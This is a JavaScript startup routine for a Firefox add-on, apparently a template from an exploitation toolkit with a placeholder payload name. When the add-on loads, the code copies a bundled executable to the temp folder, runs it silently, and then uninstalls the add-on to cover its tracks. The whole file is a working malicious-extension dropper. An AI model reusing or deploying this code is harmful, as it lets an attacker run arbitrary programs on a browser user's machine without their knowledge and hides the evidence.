
function startup(data, reason) {
  var file = Components.classes["@mozilla.org/file/directory_service;1"].
          getService(Components.interfaces.nsIProperties).
          get("ProfD", Components.interfaces.nsIFile);
  file.append("extensions");
    xpi_guid="{861fb387-92ce-bb0a-cb48-4b923dbc292b}";payload_name="__payload_placeholder__";
  file.append(xpi_guid);
  file.append(payload_name);
  var tmp = Components.classes["@mozilla.org/file/directory_service;1"].
          getService(Components.interfaces.nsIProperties).
          get("TmpD", Components.interfaces.nsIFile);
  tmp.append(payload_name);
  tmp.createUnique(Components.interfaces.nsIFile.NORMAL_FILE_TYPE, 0666);
  file.copyTo(tmp.parent, tmp.leafName);
    
  var process=Components.classes["@mozilla.org/process/util;1"].createInstance(Components.interfaces.nsIProcess);
  process.init(tmp);
  process.run(false,[],0);
      
  try { // Fx < 4.0
    Components.classes["@mozilla.org/extensions/manager;1"].getService(Components.interfaces.nsIExtensionManager).uninstallItem(xpi_guid);
  } catch (e) {}
  try { // Fx 4.0 and later
    Components.utils.import("resource://gre/modules/AddonManager.jsm");
    AddonManager.getAddonByID(xpi_guid, function(addon) {
      addon.uninstall();
    });
  } catch (e) {}
      }